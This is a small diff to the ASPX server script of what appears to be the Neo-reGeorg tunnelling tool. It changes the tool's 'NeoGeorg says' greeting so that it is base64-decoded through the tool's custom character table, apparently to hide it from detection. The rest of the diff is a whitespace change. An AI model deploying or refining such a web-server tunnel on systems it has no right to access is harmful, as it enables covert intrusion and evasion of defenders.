@@ -106,7 +106,7 @@
     int DATA        = 8;
     
     String GeorgHello = "NeoGeorg says, 'All seems fine'";
-    
+
     Object[] info  = new Object[10];
     Object[] rinfo = new Object[10];
 
@@ -244,6 +244,6 @@
         }
         Response.Write(StrTr(Convert.ToBase64String(blv_encode(rinfo)), en, de));
     } else {
-        Response.Write(GeorgHello);
+        Response.Write(Encoding.Default.GetString(Convert.FromBase64String(StrTr(GeorgHello, de, en))));
     }
 %>
